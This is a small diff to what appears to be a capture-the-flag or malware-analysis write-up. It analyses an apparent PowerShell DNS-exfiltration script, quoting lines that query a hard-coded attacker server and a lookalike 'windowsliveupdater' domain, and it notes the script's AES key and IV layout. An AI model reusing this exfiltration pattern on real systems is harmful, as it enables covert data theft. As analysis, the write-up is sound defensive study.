@@ -119,7 +119,7 @@ Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
 }
 ```
-It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an AES initialization vector, as this can be gathered from the 'Decrypt-String' function:
+It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an AES initialization vector, as this can be gathered from the 'Decrypt-String' function which contains the following statement:
 
 ```powershell
 $IV = $bytes[0..15]
